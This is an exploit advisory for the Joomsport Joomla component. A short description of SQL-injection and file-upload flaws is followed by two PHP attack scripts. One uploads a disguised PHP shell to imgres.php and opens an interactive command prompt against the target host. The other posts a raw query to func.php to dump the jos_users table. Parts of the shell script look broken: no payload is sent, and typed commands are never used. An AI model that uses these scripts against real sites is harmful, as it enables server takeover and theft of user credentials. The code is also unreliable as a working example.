source: http://www.securityfocus.com/bid/53944/info

The Joomsport component for Joomla! is prone to an SQL-injection vulnerability and an arbitrary file-upload vulnerability because it fails to sanitize user-supplied data.

Exploiting these issues could allow an attacker to compromise the application, execute arbitrary code, access or modify data, or exploit latent vulnerabilities in the underlying database. 

<?php

error_reporting(0);
set_time_limit(0);
ini_set("default_socket_timeout", 5);
function http_send($host, $packet)
{
$sock = fsockopen($host, 80);
while (!$sock)
{
print "\n[-] No response from {$host}:80 Trying again...";
$sock = fsockopen($host, 80);
}
fputs($sock, $packet);
while (!feof($sock)) $resp .= fread($sock, 1024);
fclose($sock);
return $resp;
}
print "\n|===============================================|";
print "\n| Joomla (com_joomsport) Arbitrary Shell Upload |";
print "\n| Provided By KedAns-Dz <ked-h[at]hotmail[.]com>|";
print "\n|===============================================|\n";
if ($argc < 2)
{
print "\nUsage : php $argv[0] [host] [path]";
print "\nExample : php $argv[0] www.p0c.tld /wp/\n";
die();
}
$host = $argv[1];
$path = $argv[2];
$data = "Content-Disposition: form-data; name=\"Filename\"; filename=\"k3d.php.png\"\r\n";
$data .= "Content-Type: application/octet-stream\r\n\r\n";
$packet = "POST {$path}components/com_joomsport/includes/imgres.php HTTP/1.0\r\n";
$packet .= "Host: {$host}\r\n";
$packet .= "Content-Length: ".strlen($data)."\r\n";
$packet .= "Content-Type: image/png\r\n";
$packet .= "Connection: close\r\n\r\n";
$packet .= $data;
preg_match("/OnUploadCompleted\((.*),\"(.*)\",\"(.*)\",/i", http_send($host, $packet), $html);
if (!in_array(intval($html[1]), array(0, 201))) die("\n[-] Upload failed! (Error {$html[1]})\n");
else print "\n[-] Shell uploaded to {$html[2]}...starting it!\n";
define(STDIN, fopen("php://stdin", "r"));
while(1)
{
print "\n Inj3ct0rK3d-Sh3lL#";
$cmd = trim(fgets(STDIN)); # f.ex : C:\\k3d.php.png
if ($cmd != "exit")
{
$packet = "GET {$path}k3d.php.png{$html[3]} HTTP/1.0\r\n";
$packet.= "Host: {$host}\r\n";
$packet.= "Connection: close\r\n\r\n";
$output = http_send($host, $packet);
}
else break;
}
?>

Access Shell : http://www.example.com/components/com_joomsport/images/k3d.php.png

#### Exploit (2) Blind SQL Injection =>

<?php

$bs =
curl_init("http://www.example.com/components/com_joomsport/includes/func.php");
curl_setopt($bs, CURLOPT_POST, true);
curl_setopt($bs, CURLOPT_POSTFIELDS,
array('query'=>"SELECT * FROM jos_users"));
curl_setopt($bs, CURLOPT_RETURNTRANSFER, 1);
$postResult = curl_exec($bs);
curl_close($bs);
print "$postResult";

?>